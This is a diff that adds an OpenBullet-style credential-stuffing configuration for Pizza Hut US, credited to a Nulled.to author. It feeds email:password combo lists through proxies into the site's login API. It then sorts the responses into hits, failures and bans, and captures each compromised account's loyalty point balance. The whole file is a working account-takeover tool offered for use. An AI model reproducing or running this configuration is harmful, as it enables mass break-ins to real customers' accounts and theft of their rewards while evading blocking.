@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Pizza Hut US",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-30T20:56:04.717628+02:00",
+  "AdditionalInfo": "Needs US proxies",
+  "Author": "Bogdan/Nulled.to",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.pizzahut.com/api.php/site/api_pages/api_menu/getstoretiles" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://www.pizzahut.com/api.php/site/api_ajax/login/do_login" AutoRedirect=FALSE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":false,\"recaptcha2\":\"\",\"loyalty\":\"\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.pizzahut.com" 
+  HEADER "Referer: https://www.pizzahut.com/index.php" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"signed in\"" 
+    KEY "\"rewards_available\"" 
+  KEYCHAIN Failure OR 
+    KEY "password you entered is incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "<TITLE>Access Denied</TITLE>" 
+
+PARSE "<SOURCE>" LR "\"available_pts\":" "," -> CAP "Points" "" " | Bogdan/Nulled.to" 
+
